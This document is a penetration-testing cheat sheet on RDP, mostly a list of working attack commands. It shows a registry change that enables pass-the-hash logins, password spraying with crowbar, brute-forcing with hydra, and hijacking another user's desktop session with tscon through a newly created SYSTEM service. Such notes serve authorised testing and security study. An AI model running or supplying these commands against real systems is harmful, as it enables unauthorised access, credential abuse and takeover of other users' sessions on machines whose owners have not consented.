# RDP

## **Introduction**

> * By default, Remote Desktop Protocol (RDP) uses port TCP/3389.
> * RDP is a protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.
> * It is one of the most popular administration tools, allowing system administrators to centrally control their remote systems with the same functionality as if they were on-site.
> * Unfortunately, while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks.

***

## **RDP Enumeration & Interaction Commands**

**Login to RDP:**

* Option 1: `xfreerdp /v:10.10.10.100 /u:admin /p:password`
* Option2: `rdesktop -u admin -p password123 10.10.10.100`
* Add a local directory as an SMB Share: `xfreerdp /v:10.10.10.100 /u:admin /p:password +home-drive`
* Pass the Hash login:
  1. Disable Restricted Admin Mode: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
  2. Perform PtH: `xfreerdp /v:10.10.10.100 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`

**Finding Credentials:**

* Password spraying against the RDP service: `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
* Brute-forcing the RDP service: `hydra -L usernames.txt -p 'password123' 10.10.10.100 rdp`

***

## **RDP Session Hijacking**

> To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session.

**Performing Session Hijacking:**

1. **With SYSTEM Privileges:**
   * Impersonate a user without its password: `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`
2. **Without SYSTEM Privileges:**
   * Create a windows service running as SYSTEM: `sc.exe create servicename binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"`
   * Start the poisoned service: `net start servicename`